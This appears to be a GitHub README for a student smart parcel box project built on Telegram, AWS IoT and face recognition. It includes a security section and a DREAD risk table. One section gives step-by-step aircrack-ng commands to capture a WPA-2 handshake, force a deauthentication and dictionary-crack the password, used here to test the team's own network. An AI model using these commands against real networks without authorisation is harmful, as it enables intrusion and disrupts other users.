# ET0731 Smart Package Collection
# Introduction
Online shopping has exploded in popularity over the past few years. Due to its sheer convenience, as items can be purchased in just a few clicks and have it delivered to your door steps it is no wonder that online shopping is thriving. The problem with online shopping arise when the owner is not at home. Sure, the delivery driver could leave it at the doorstep but having the constant worry when you are at work or outside, praying that your parcel will not get stolen is not a good feeling hence, our group decided to implement secure parcel which allows the parcel delivered to be stored securely and not accessible to unauthorised person. The project is designed with security in mind adhering to the TR64 standards. Here is our proposal: [Click Here](https://docs.google.com/document/d/1hL6X2pi4P2A_upCq-u1yGGLxqWMyI3t6xrg3M8eDuIA/edit?usp=sharing)

# The Team
This project is implemented with a team of four:<br/>
 1)Zi Xiong (1946965)<br/>
 2)Ashwin (1802360)<br/>
 3)Rusyaidi (1821149)<br/>
 4)Liang Zhi (1821347)<br/>
 
 # Video Demo
 [![IMAGE ALT TEXT HERE](https://img.youtube.com/vi/XM84-S1RU-w/0.jpg)](https://www.youtube.com/watch?v=XM84-S1RU-w)<br/>
 If you would like to see detailed code of Ai look at the guide done by Ash<br/>
 [Sipeed ai coding done by Ash](https://github.com/liang-zhi/Secure-Parcel/tree/master/Spieed%20doc)
 
 
 # Features
### Telegram bot
The telegram bot handles the inputs from the user as well as outputs to the user. There are many commands to use when inputting to the bot, they are as follow:
1. unlock
   - Only authorised user are allowed to use this command.
   - Typing unlock will unlock the parcel remotely.
   - Once the box has been unlocked, the telegram bot will reply to inform the user that it is unlocked.
   
2. lock
   - Only authorised user are allowed to use this command
   - Typing lock will lock the parcel remotely
   - Once the box has been locked, the telegram bot will reply to inform the user that it is locked
   
3. storeface
   - This command will store the user face into the the flash memory of the AI on Edge.
   - User face has to face the camera and when there is outline of the face appearing in the LCD screen, send the storeface command.
   - Once the face has been stored, user will be notified by the telegram bot.
   
### AI on Edge
The AI on Edge only works for face that are stored in the flash memory hence, it is important to not store unauthorised face in the memory. When the camera detect the face of the person and it matches the face that is stored in the flash memory (0.85 accuracy score is required), the box will be unlocked. The purpose of the AI on edge is to allow for convenience when unlocking the parcel as all you have to do is face the camera and the box will be unlocked.

### Amazon Web Services

1. Lambda
   1. Receive commands from the user
   2. Send Command to the users
   3. Interacts with AWS IoT topic.
   ![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/lambda.png)
   
2. IoT Core
   1. Connects ESP32 to cloud
   2. Device has its own publish/subscribe topic
   3. Uses secure protocol MQTTS to communicate
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/iot.png)
3. API gateway
   1. Create a rest api for the telegram bot
   2. After developing a rest api, invoke url will be created to hook it to telegram
   3. Once hooked to telegram api, telegram bot can receive and send commands to AWS.
   ![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/awsapi.png)

4. Cloudtrail
   1. Logs down suspicious api request
   ![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/cloudtrail.jpeg)

4. CloudWatch
   1. Logs down each time lambda function is activated
   2. Logs down all MQTT and https request
   ![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/CloudWatch_Management_Console.png)
   
   



# Security Features
**TLS Security:** AWS IoT message broker uses TLS version 1.2 to encrypt all communication. TLS is used to ensure the confidentiality of the application protocols. For MQTT, TLS encrypts the connection between the device and the broker. TLS client authentication is also used to identify devices. 

**AWS IoT Device Security:** Each device identifies itself and authenticates to the cloud using a X.509 certificate. Policies are used to control access rights of each device.

**Use strong and unique passwords for WiFi network:** Use long password with different mix characters. Such characters include a mixture of upper and lower case alphabet, numbers and characters such as (!#%*) so that our password is strong and unique.

**Use of HTTPS:** Device Certificates and json files are requested via HTTPS instead of HTTP which is more secured as data are encrypted before transmission.

**Telegram Bot:** Only Authorized Users can use the bot and custom commands are created such that only authorized users know how to use it

**API Security:** Unique API keys are used to connect telegram to AWS Lambda.

**AI on Edge:** Connected locally and hence has no access to internet.

**Jamming of ports:** The flashing port is jammed to prevent unauthorised flashing of firmware

![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/portjammer.png)

# Product Infrastructure
**Network Diagram**</br>
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/ProductInfrastructure.JPG)






# Timing Diagram
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/timeline.JPG)<br/>

# Electronics Assembly
Picture of the circuit diagram here

![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/circuitdiag.png)<br/>
Picture of the finished circuit board

![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/circuit.jpg)


# Picture of the finished product
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/box.jpg)

# How to use

### Step 1 - Registering a telegram account
To use this bot, the user has to create a telegram account. Some particulars are required such as phone number and their name.

### Step 2 - Bot setup
After registering, the user will now need to allow the bot to send and receive message from the user by typing /start. Once this has been setup, user can check if they are authorised to send commands to the bot. If the user is not authorised, they bot will inform the user that he/she is not authorised.

### Step 3 - Unlocking and locking
Once all have been setup, the box is ready to be used. When the delivery man comes, the owner can unlock the box for the delivery man to put the parcel inside. Once the parcel has been placed inside, the deliveryman will close the door lid which after 10 seconds will be automatically locked. The owner of the secure parcel can ensure that the parcel has been locked by sending a lock command to the telegram bot. Once the owner has reached home and he/she wants to retrieve the parcel stored inside, he/she can send an unlock command to the telgram bot to unlock the box or use the Ai facial recongnition to unlock the box.

To use facial recognition to unlock the box, the owner has to store his/her face in the memory of the Ai on Edge. To do so, he/she will have to face the camera of the Ai on Edge and send a storeface command to the telgram bot to capture the face. Once this is done, all the owner has to do to unlock the box is face the camera directly and the box will be unlocked.


# Penetration testing With Kali Linux
To test the security of the network, we are using kali linux aircrack to try and crack the WPA-2 secured wifi network.
Tools required are VM with kali linux installed, in this case we are using oracle vm virtual box. A WiFi adapter is also required.

The first step is to start our wifi adapter to start collecting packets and to do so, we type sudo airmon-ng start wlan0mon in the kali linux terminal.


After which, we type sudo airodump-ng wlan0mon in the terminal to get the necessary information to attack the network. Information required are the BSSID of the network, channel number and the security </br>
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/getwifiinfo.png)</br>


To start cracking the wifi using a password list, we first have to initiate a 4 way authentication handshake and we type airodump-ng -c 11 --bssid <mac address of victim> -w out wlan0mon in the terminal
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/settinghandshake.PNG)</br>

    -c 9 is the channel for the wireless network
    --bssid is the access point MAC address. This eliminates extraneous traffic.
    -w out is the file name prefix for the file which will contain the IVs.
    wlan0mon is the interface name.

After this, we have to wait awhile to capture the 4 way authentication handshake. If you see WPA handshake: <mac address of victim> on the top right, it means that you have successfully created the 4 way authentication handshake and you can start attacking the network using the password list, if not you have to wait or speed thing us by sending a deauth to the network you are attacking.


![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/kali1.PNG)


To speed up the process, we type in aireplay-ng -0 1 -a <mac address of AP> -c <mac address of victim> wlan0mon to the terminal to speed up the capturing of 4 way handshake.
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/kali2.png)


    -0 means deauthentication
    1 is the number of deauths to send (you can send multiple if you wish)
    -a <mac address> is the MAC address of the access point
    -c <mac address> is the MAC address of the client you are deauthing
    wlan0mon is the interface name
    
Once you have captured the handshake, you can type aircrack-ng -w password.lst -b <mac address of victim> out-01.cap


    -w password.lst is the name of the dictionary file. Remember to specify the full path if the file is not located in the same directory.
    out-01.cap is name of group of files containing the captured packets. 
    
    
    
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/kali3.PNG)



![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/kali4.jpeg)
# Compliance checklist
### Dread risk assessment
|                            | DREAD RISK       |                 |                |                |                |              |
| -------------------------- | ---------------- | --------------- | -------------- | -------------- | -------------- | ------------ |
| Attack                     | Damage Potential | Reproducibility | Exploitability | Affected Users | Discoverablity | Risk (MAX=5) |
| WiFi access                | 5                | 5               | 4              | 4              | 1              | 3.8          |
| Unauth connection (stolen) | 2                | 4               | 1              | 1              | 1              | 1.8          |
| Cloning of hardware        | 5                | 2               | 3              | 2              | 1              | 2.6          |
| Session hijack             | 5                | 1               | 3              | 1              | 3              | 2.6          |
| Physical tampering         | 4                | 1               | 3              | 4              | 1              | 2.6          |
| RF jamming                 | 4                | 4               | 4              | 4              | 2              | 3.6          |
| Hardware Error             | 3                | 1               | 1              | 1              | 1              | 1.4          |
| Man in the middle          | 5                | 2               | 5              | 1              | 5              | 3.4          |
| Modified data              | 5                | 2               | 5              | 1              | 4              | 3.4          |
| User ID Leak               | 2                | 1               | 4              | 2              | 3              | 2.5          |
| DDOS of API                | 5                | 5               | 4              | 2              | 1              | 4            |
| Redirect notification      | 4                | 1               | 3              | 1              | 1              | 2            |
| Botnet inclusion           | 3                | 1               | 2              | 1              | 5              | 2.4          |
| Cryptojacking              | 1                | 1               | 4              | 1              | 4              | 2.6          |

### TR64 Checklist
![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/TR64.JPG)
# Improvements
Even though the product is quite secure, potential improvement can be done to improve the security of the product and make it more marketable

![image](https://github.com/liang-zhi/Secure-Parcel/blob/master/image/Improvement.png)









